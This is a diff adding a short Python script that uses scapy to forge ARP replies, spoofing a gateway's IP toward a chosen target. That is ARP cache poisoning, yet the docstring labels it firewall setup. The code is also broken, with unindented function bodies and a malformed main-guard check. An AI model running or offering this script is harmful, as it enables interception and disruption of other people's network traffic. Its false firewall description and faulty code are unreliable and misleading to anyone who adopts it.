@@ -1,0 +1,30 @@
+
+```python
+import scapy.all as scapy
+def forge_arp_packet(target_ip, gateway_ip):
+    """Forges an ARP packet with the specified target IP and gateway IP."""
+arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=gateway_ip)
+return arp_packet
+
+def send_arp_packet(arp_packet, interface):
+    """Sends the specified ARP packet on the specified interface."""
+scapy.sendp(arp_packet, iface=interface)
+
+def main():
+    """Sets up the firewall by sending forged ARP packets."""
+# Get the target IP and gateway IP.
+target_ip = input("Enter the target IP address: ")
+gateway_ip = input("Enter the gateway IP address: ")
+
+# Get the interface to use.
+interface = input("Enter the interface to use: ")
+
+# Forge the ARP packet.
+arp_packet = forge_arp_packet(target_ip, gateway_ip)
+
+# Send the ARP packet.
+send_arp_packet(arp_packet, interface)
+
+if name == "main":
+    main()
+```
